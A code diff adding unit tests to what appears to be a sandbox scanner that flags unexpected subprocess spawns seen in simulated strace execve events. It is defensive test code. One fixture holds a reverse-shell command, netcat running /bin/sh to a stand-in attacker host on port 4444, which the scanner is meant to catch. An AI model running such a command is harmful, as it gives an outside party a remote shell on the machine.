@@ -92,6 +92,77 @@ def test_a_couple_of_scattered_opens_stay_individual():
     assert len(file_findings) == 2
 
 
+def _execve_event(path: str, argv: list) -> StraceEvent:
+    argv_str = ", ".join(f'"{a}"' for a in argv)
+    return StraceEvent(
+        pid="1",
+        timestamp="00:00:00.000000",
+        syscall="execve",
+        raw_args=f'"{path}", [{argv_str}], 0x7fff0000 /* 14 vars */',
+        result="0",
+    )
+
+
+def test_unexpected_subprocess_spawn_becomes_a_finding():
+    events = [
+        _execve_event("/usr/bin/sh", ["sh", "-c", "python3 scripts/format.py"]),
+        _execve_event("/usr/local/bin/python3", ["python3", "scripts/format.py"]),
+        _execve_event("/usr/bin/nc", ["nc", "-e", "/bin/sh", "attacker.example", "4444"]),
+    ]
+    result = SandboxRunResult(
+        invocation="python3 scripts/format.py",
+        exit_code=0,
+        timed_out=False,
+        strace_events=events,
+        dns_queries=[],
+        http_flows=[],
+    )
+
+    findings = sandbox_result_findings(result)
+    spawn_findings = [f for f in findings if f.category == "unexpected_subprocess"]
+    assert len(spawn_findings) == 1
+    assert "nc" in spawn_findings[0].summary
+    assert spawn_findings[0].severity == Severity.MEDIUM
+
+
+def test_declared_invocation_and_wrapper_never_become_findings():
+    events = [
+        _execve_event("/usr/bin/sh", ["sh", "-c", "python3 scripts/format.py"]),
+        _execve_event("/usr/local/bin/python3", ["python3", "scripts/format.py"]),
+    ]
+    result = SandboxRunResult(
+        invocation="python3 scripts/format.py",
+        exit_code=0,
+        timed_out=False,
+        strace_events=events,
+        dns_queries=[],
+        http_flows=[],
+    )
+
+    findings = sandbox_result_findings(result)
+    assert [f for f in findings if f.category == "unexpected_subprocess"] == []
+
+
+def test_many_spawns_of_the_same_command_collapse_to_one_finding():
+    events = [
+        _execve_event("/usr/bin/sh", ["sh", "-c", "python3 scripts/build.py"]),
+        _execve_event("/usr/local/bin/python3", ["python3", "scripts/build.py"]),
+    ] + [_execve_event("/usr/bin/gcc", ["gcc", f"file{i}.c"]) for i in range(5)]
+    result = SandboxRunResult(
+        invocation="python3 scripts/build.py",
+        exit_code=0,
+        timed_out=False,
+        strace_events=events,
+        dns_queries=[],
+        http_flows=[],
+    )
+
+    findings = sandbox_result_findings(result)
+    spawn_findings = [f for f in findings if f.category == "unexpected_subprocess"]
+    assert len(spawn_findings) == 1
+    assert "5x" in spawn_findings[0].summary
+
+
 def _clean_report(name: str = "clean-skill") -> Report:
     return Report(
         skill_path=f"/tmp/{name}",
